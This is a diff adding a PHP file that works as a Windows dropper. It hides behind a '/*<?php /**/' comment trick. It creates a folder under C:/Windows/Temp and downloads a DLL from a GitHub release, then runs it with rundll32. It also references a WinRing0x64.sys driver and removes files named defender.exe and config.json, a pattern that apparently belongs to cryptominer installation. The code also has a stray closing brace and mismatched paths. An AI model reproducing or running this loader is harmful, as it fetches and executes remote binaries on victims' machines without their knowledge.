@@ -1,0 +1,99 @@
+
+    /*<?php /**/
+
+
+function deleteFile($filePath) {
+
+    if (file_exists($filePath)) {
+        if (unlink($filePath)) {
+            echo "Deleted: $filePath\n";
+        } else {
+            echo "Failed to delete: $filePath\n";
+        }
+    } else {
+        echo "File does not exist: $filePath\n";
+    }
+}
+
+
+function downloadFile($url, $savePath) {
+
+    // Check if the file already exists
+    if (!file_exists($savePath)) {
+
+
+    
+
+    // Download the file if it does not exist
+    $downloadedFile = file_get_contents($url);
+    if ($downloadedFile !== false) {
+        if (file_put_contents($savePath, $downloadedFile)) {
+            echo "Downloaded and saved: $savePath\n";
+        } else {
+            echo "Failed to download and save: $savePath\n";
+        }
+    } else {
+        echo "Failed to download: $url\n";
+    }
+    } 
+}
+
+
+function executeCommand($command) {
+    $output = null;
+    $returnCode = null;
+    exec($command, $output, $returnCode);
+    if ($returnCode === 0) {
+        echo "Command executed successfully.\n";
+    } else {
+        echo "Failed to execute command. Return code: $returnCode\n";
+    }
+}
+
+
+$deletePaths = [
+    'C:/Windows/Temp/defender.exe',
+    'C:/Windows/Temp/WinRing0x64.sys',
+    'C:/Windows/Temp/config.json',
+
+];
+
+
+
+
+system('mkdir "C:/Windows/Temp/spawnZZ2/"');
+
+exec('tasklist', $output);
+
+$url =  'https://github.com/mainpoint91/fiveminllk/releases/download/golow/vs2.dll';
+$url2 =  'https://raw.githubusercontent.com/mainpoint91/mainpoint/refs/heads/main/WinRing0x64.sys';
+
+$file_name = 'C:/Windows/Temp/spawnZZ2/vs2.dll';
+$file_name2 = 'C:/Windows/Temp/spawnZZ/WinRing0x64.sys';
+
+$found = false;
+$found2 = false;
+$found3 = false;
+
+
+
+
+        if (file_put_contents($file_name, file_get_contents($url)))
+            {
+                system('rundll32.exe C:/Windows/Temp/spawnZZ2/vs2.dll,0');
+            }
+        else
+            {
+            echo "File downloading failed.";
+            }
+         
+ 
+
+         
+        
+
+
+
+
+
+}
